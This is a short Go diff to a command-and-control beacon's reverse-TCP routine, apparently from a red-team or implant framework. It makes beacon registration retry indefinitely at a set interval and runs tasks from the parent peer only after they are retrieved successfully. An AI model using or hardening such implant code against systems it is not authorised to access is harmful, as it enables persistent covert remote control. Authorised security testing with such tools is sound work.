@@ -27,8 +27,10 @@ func beaconReverseTcp() {
 
 	// Registering Beaocn by talking with parent peer
 	beaconId, err := core.RegisterBeacon(trp)
-	if err != nil {
-        utils.Print("Error while registering", err.Error())
+	for err != nil {
+		utils.Print("Error while registering", err.Error())
+		time.Sleep(time.Millisecond * time.Duration(profiles.Config.Interval))
+		beaconId, err = core.RegisterBeacon(trp)
 	}
 
     utils.Print("Connection ID", beaconId)
@@ -40,8 +42,9 @@ func beaconReverseTcp() {
 		tasks, err := core.RetreiveTask(trp, beaconId)
 		if err != nil {
             utils.Print("Error while retreiving task from parent peer", err.Error())
+		} else {
+			core.HandleTasks(*tasks, core.SendTaskResult)
 		}
-		core.HandleTasks(*tasks, core.SendTaskResult)
 
 	}
 }
